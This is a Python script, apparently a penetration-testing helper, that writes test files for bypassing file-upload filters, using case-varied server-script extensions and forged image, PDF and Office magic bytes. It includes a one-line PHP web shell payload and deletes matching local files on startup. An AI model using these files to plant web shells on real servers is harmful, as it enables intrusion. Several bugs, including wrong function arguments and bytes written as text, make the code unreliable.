#/usr/bin/env python3
import argparse
import os

extension_php = ["php", "PHP", "PhP", "pHp", "phtml", "pHtml","php3", "PhP3", 
"PHP3" "php5", "pHp5", "PHP5", "inc", "iNc", "INC" ]
extension_asp = ["asp", "ASP", "AsP", "aspx", "ASPX", "Aspx"]
extension_perl = ["pl", "PL", "Pl", "pm", "PM", "Pm", "cgi", "CGI", "cGi", "lib", "LIB", "lIb"]
extension_jsp = ["jsp", "JSP", "Jsp", "jspx", "jSpX", "JSPX", "jsw", "JSW", "jsW", "jsv", "Jsv", "JSV", 
"jspf", "jSpf", "JSPF"]
extension_colfusion = ["cfm", "CFM", "Cfm", "cfml", "CFML", "CfmL", "cfc", "CfC", "CFC", "dbm", "DBM", "Dbm"]
extension_gif = ["gif", "Gif", "GIF", ""]
extension_png = ["PNG", "png", "PnG", ""]
extension_jpeg = ["jpeg", "JPEG", "JpEG", ""]
extension_svg = ["svg", "SVG", "SvG"]
extension_pdf = ["pdf", "PDF", "Pdf"]
extension_exe = ["doc", "xls", "ppt", "msg", "Doc", "Xls", "Ppt", "Msg", "DOC", "XLS", "PPT"]

mg_gif = b"\x47\x49\x46\x38\x37\x61"
mg_gif_2 = b"\x47\x49\x46\x38\x39\x61"
mg_png = b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A"
mg_jpeg = b"\xFF\xD8\xFF\xDB"
mg_jpeg_2 = b"\xFF\xD8\xFF\xEE"
mg_jpeg_3 = b"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01"
mg_pdf = b"\x25\x50\x44\x46\x2d"
mg_office = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"

payload_php = ["<?php echo '<p>Hello there!</p>'; ?>", "<?php system($_GET['cmd']);?>"]
payload_asp = ['<%Response. Write( "HeIIo there"); %>']
payload_perl = ['print("Hello, there!\n");']
payload_jsp = ["Hello there, today is: <%= new java.util.Date().toString() %>"]
payload_colfucion = ['<cfscript> writeOutput("Hello World!"); </cfscript>']
payload_bash =[""]
payload_powershell = [""] 
payload_html = [""]
payload_js = [""]
payload_css = [""]


def ex_generator(extension, module):
	if extension == 'php':
		for ex in extension_php:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, payload_php[0])
	elif extension == 'asp':
		for ex in extension_asp:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, payload_asp[0])
	elif extension == "perl":
		for ex in extension_perl:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, payload_perl[0])
	elif extension == "jsp":
		for ex in extension_jsp:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, payload_jsp[0])
	elif extension == "coldfusin":
		for ex in extension_colfusion:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, payload_colfucion[0])
	f.close()

def magic_files(extension):
	if extension == "gif":
		for ex in extension_gif:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_gif)
	if extension == "png":
		for ex in extension_png:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_png)
	if extension == "jpeg":
		for ex in extension_jpeg:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_jpeg)
	if extension == "pdf":
		for ex in extension_pdf:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_pdf)

	if extension == "office":
		for ex in extension_exe:
			f = open("1." + ex, "w")
			magic_bytes("1." + ex, mg_office)

def magic_bytes(file, bytes):
	with open(file, "ab") as binary_file:
		num_bytes_written = binary_file.write(bytes)
		
def add_script(file, script):
	with open(file, "ab") as text_file:
		text_written = text_file.write(script)


parser = argparse.ArgumentParser(description='File generator')
try:
	os.system("rm 1*")
except e:
	print(e)

parser.add_argument('-e', dest='format', help="generate file", 
	choices=['php', 'asp', 'perl', 'jsp', 'coldfusin', 'gif', 'png', 'jpeg', 'svg', "pdf", "office"])

args = parser.parse_args()

extension = args.format
if extension == 'php':
	ex_generator('php')
elif extension == "asp":
	ex_generator('asp')
elif extension == "perl":
	ex_generator('perl')
elif extension == "jsp":
	ex_generator("jsp")
elif extension == "coldfusin":
	ex_generator("coldfusin")
elif extension == "png":
	magic_files('png')
elif extension == "gif":
	magic_files('gif')
elif extension == "jpeg":
	magic_files('jpeg')
elif extension == "svg":
	magic_files('svg')
elif extension == "pdf":
	magic_files('pdf')
elif extension == "office":
	magic_files('office')
	
	
	
	
